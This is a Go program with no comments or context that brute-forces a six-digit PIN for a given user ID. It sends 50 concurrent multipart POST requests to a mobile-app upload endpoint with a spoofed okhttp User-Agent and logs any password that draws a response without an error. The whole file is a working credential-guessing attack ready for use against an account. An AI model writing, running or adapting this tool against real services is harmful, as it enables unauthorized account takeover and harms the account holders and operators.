package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"strings"
)

type work struct {
	rq *http.Request
	pw string
}

const max = 999999
const threads = 50

var userId string
var uri string = "https://branch.localhost/gw/mob/uplFileMul"

func newWork(Pw int) (*work, error) {
	Ret := new(work)
	body := new(bytes.Buffer)
	w := multipart.NewWriter(body)
	if err := w.WriteField("un", userId); err != nil {
		return Ret, err
	}
	pw := fmt.Sprintf("%06d", Pw)
	if err := w.WriteField("pwd", pw); err != nil {
		return Ret, err
	}
	if err := w.Close(); err != nil {
		return Ret, err
	}
	rq, err := http.NewRequest("POST", uri, body)
	if err != nil {
		return Ret, err
	}
	rq.Header.Set("User-Agent", "okhttp/3.14.9")
	Ret.rq = rq
	Ret.pw = pw
	return Ret, nil
}

func do(Jobs <-chan *work, Return chan<- error) {
	Client := new(http.Client)
	for w := range Jobs {
		R, err := Client.Do(w.rq)
		if err != nil {
			Return <- err
		}
		body, err := ioutil.ReadAll(R.Body)
		if err != nil {
			Return <- err
		}
		R.Body.Close()
		b := string(body)
		if !strings.Contains(b, "err") {
			log.Println(w.pw)
		}
		Return <- nil
	}
}

func main() {
	if len(os.Args) > 1 {
		userId = os.Args[1]
	} else {
		fmt.Printf("A UserId must be supplied.\nUsage:\n\n\t%s <UserId>\n\n", os.Args[0])
		return
	}
	jobs := make(chan *work, threads)
	result := make(chan error)

	for i := 0; i < threads; i++ {
		go do(jobs, result)
	}
	go func() {
		for i := 0; i < max; i++ {
			work, err := newWork(i)
			if err != nil {
				result <- err
			}
			jobs <- work
		}
	}()
	for i := 0; i < max; i++ {
		if err := <-result; err != nil {
			log.Fatalln(err)
		}
	}
	close(jobs)
	close(result)
}
